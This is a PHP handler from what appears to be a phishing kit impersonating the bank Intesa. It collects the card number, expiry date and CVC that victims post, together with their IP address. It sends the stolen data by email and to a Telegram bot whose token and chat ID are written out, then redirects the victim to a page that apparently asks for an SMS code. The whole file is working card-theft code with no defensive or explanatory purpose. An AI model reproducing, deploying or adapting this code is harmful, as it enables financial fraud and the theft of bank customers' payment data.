<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if(!empty($_POST['number'])  && !empty($_POST['expiry']) && !empty($_POST['cvc'])){

$cc = str_replace("+","",$_POST['ccnum']);
$message .= "=========[ggg]=========\n";
$message .= "Creditcardnummer  : ".$_POST['number']."\n";
$message .= "Date expiration : ".$_POST['expiry']."\n";
$message .= "CVV  : ".$_POST['cvc']."\n";
$message .= "===============[IP]==============\n";
$message .= "IP : http://www.geoiptool.com/?IP=$ip\n";
$message .= "==========[ggg]=========";
$to="gmers.com";
$subject = "CC INTESA  [$ip]";
$headers = "From: CC INTESA <bladzb.de>";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);
		    $token = "7620796636:AAFpbNIADiQYRqgoFGF4kiNADAwDQqGfQPM";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-5052128612&text=" . urlencode($message)."" );
header("Location:../sms.php");
}else{
header("Location:../kaart.php?error");
}